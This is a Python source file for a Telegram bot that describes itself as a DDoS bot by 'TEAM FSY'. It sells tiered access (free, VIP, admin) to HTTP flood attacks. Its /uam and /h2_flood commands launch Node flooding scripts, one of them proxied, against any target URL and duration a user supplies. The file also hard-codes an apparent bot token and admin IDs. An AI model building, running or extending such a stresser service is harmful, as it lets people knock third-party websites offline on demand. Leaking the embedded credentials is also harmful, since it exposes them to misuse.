import telebot
import subprocess
import json
import os
from datetime import datetime

# --- Configuration ---
BOT_TOKEN = '8764912523:AAFeXnbEK3JDmmg82qBarxs8WVIh4RcFoKQ' # Your Bot Token
# Use a list for multiple admin IDs
ADMIN_IDS = [7993202287, 7554307520, 6640692035, 7895004965] # Your Telegram User IDs
USER_DATA_FILE = 'users.json'
FREE_USER_ATTACK_LIMIT = 3
# -----------------------------

bot = telebot.TeleBot(BOT_TOKEN)

# --- Data Management ---
def load_user_data():
    """Loads user data from the JSON file. If the file doesn't exist or is invalid, it creates a default structure."""
    try:
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # Create a default structure with admins, vips, and free user tracking
        return {"admins": ADMIN_IDS, "vips": [], "free_usage": {}}

def save_user_data(data):
    """Saves the user data to the JSON file."""
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# --- User Level Check ---
def get_user_level(user_id):
    """Checks the authorization level of a user (admin, vip, or free)."""
    data = load_user_data()
    if user_id in data.get('admins', []):
        return 'admin'
    elif user_id in data.get('vips', []):
        return 'vip'
    else:
        return 'free'

# --- Free User Usage Tracking ---
def check_free_user_limit(user_id):
    """Checks if a free user has exceeded their daily attack limit. Returns True if they can attack, False otherwise."""
    data = load_user_data()
    user_id_str = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")

    if user_id_str not in data['free_usage']:
        data['free_usage'][user_id_str] = {'count': 1, 'date': today}
        save_user_data(data)
        return True

    usage_info = data['free_usage'][user_id_str]
    if usage_info['date'] != today:
        # It's a new day, reset their count
        usage_info['count'] = 1
        usage_info['date'] = today
        save_user_data(data)
        return True
    elif usage_info['count'] < FREE_USER_ATTACK_LIMIT:
        usage_info['count'] += 1
        save_user_data(data)
        return True
    else:
        # They've reached their limit for today
        return False

# --- Bot Commands ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! This is a DDoS bot made by TEAM FSY. Use /help to see available commands.")

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = """
Available Commands:

**/uam <target> <duration>** - Launch a UAM attack.
    - *Free Users*: 300s max, 3 times/day.
    - *VIP Users*: 600s max.
    - *Admins*: 3600s max.

**/h2_flood <target> <duration>** - (VIP Only) Launch a powerful H2-Stresser attack.

--- Admin Commands ---
**/give_access <user_id>** - Grant VIP access to a user.
**/remove_access <user_id>** - Revoke VIP access from a user.
    """
    bot.reply_to(message, help_text)

#
# >>>>> Admin Commands <<<<<
#
@bot.message_handler(commands=['give_access'])
def give_access(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "You do not have permission to use this command.")
        return

    try:
        user_id_to_add = int(message.text.split()[1])
        data = load_user_data()

        if user_id_to_add not in data['vips']:
            data['vips'].append(user_id_to_add)
            save_user_data(data)
            bot.reply_to(message, f"Success: User {user_id_to_add} has been granted VIP access.")
        else:
            bot.reply_to(message, f"Info: User {user_id_to_add} already has VIP access.")

    except (ValueError, IndexError):
        bot.reply_to(message, "Invalid format. Please use: /give_access <user_id>")

@bot.message_handler(commands=['remove_access'])
def remove_access(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "You do not have permission to use this command.")
        return

    try:
        user_id_to_remove = int(message.text.split()[1])
        data = load_user_data()

        if user_id_to_remove in data['vips']:
            data['vips'].remove(user_id_to_remove)
            save_user_data(data)
            bot.reply_to(message, f"Success: VIP access has been revoked for user {user_id_to_remove}.")
        else:
            bot.reply_to(message, f"Info: User {user_id_to_remove} is not a VIP.")

    except (ValueError, IndexError):
        bot.reply_to(message, "Invalid format. Please use: /remove_access <user_id>")

#
# >>>>> User Commands <<<<<
#
@bot.message_handler(commands=['uam'])
def handle_uam_attack(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Usage: /uam <target> <duration>")
            return

        target_url = parts[1]
        duration = int(parts[2])
        user_id = message.from_user.id
        user_level = get_user_level(user_id)

        max_duration = {'free': 300, 'vip': 600, 'admin': 3600}

        if duration > max_duration.get(user_level, 0):
            bot.reply_to(message, f"Your maximum allowed duration is {max_duration.get(user_level, 0)} seconds.")
            return

        if user_level == 'free':
            if not check_free_user_limit(user_id):
                bot.reply_to(message, f"You have reached your daily limit of {FREE_USER_ATTACK_LIMIT} attacks. Please try again tomorrow.")
                return
            bot.reply_to(message, f"Standard attack initiated on {target_url} for {duration} seconds.")
            command = ['node', 'wormgpt.js', target_url, str(duration), '32', '100', '3']
        else: # VIP and Admin
            bot.reply_to(message, f"VIP attack initiated on {target_url} for {duration} seconds.")
            command = ['node', 'rawcaptcha.js', target_url, str(duration), '5', '10', '6']

        subprocess.Popen(command)

    except (ValueError, IndexError):
        bot.reply_to(message, "Please provide a valid target and a numeric duration.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(commands=['h2_flood'])
def handle_h2_flood(message):
    user_id = message.from_user.id
    user_level = get_user_level(user_id)

    if user_level not in ['vip', 'admin']:
        bot.reply_to(message, "This command is only available for VIP and Admin users.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "Usage: /h2_flood <target> <duration>")
            return

        target_url = parts[1]
        duration = parts[2]
        
        bot.reply_to(message, f"Launching H2-Stresser attack on {target_url} for {duration} seconds.")
        command = ['node', 'h2-stresser.js', target_url, duration, '5', '4', 'proxy.txt']
        subprocess.Popen(command)

    except (IndexError):
        bot.reply_to(message, "Invalid format. Please use: /h2_flood <target> <duration>")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")


# --- Start The Bot ---
if __name__ == '__main__':
    print("Bot is now running...")
    load_user_data() # Initialize data file on startup
    bot.polling(none_stop=True)
